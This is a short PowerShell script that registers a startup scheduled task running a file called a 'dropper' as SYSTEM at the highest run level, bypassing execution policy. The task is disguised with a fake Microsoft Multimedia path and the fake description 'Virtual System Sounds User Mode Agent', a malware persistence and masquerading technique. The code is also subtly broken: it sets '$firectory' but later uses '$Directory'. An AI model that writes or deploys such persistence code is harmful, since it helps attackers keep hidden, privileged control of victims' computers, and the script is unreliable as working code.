$dropperfile = "PowerShellScript.ps1"
$args = "-noprofile -executionpolicy bypass -file $dropperfile"
# Location of $dropperfile
$firectory = "C:\Users\bob\Desktop\"
$time = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction "powershell.exe" "$args" -WorkingDirectory "$Directory"
$user = "NT Authority\SYSTEM"
Register-ScheduledTask -Force -User $user -Trigger $time -TaskName "\Microsoft\Windows\Multimedia\VirtualSystemSoundsService" -Action $action -Description "Virtual System Sounds User Mode Agent" -RunLevel Highest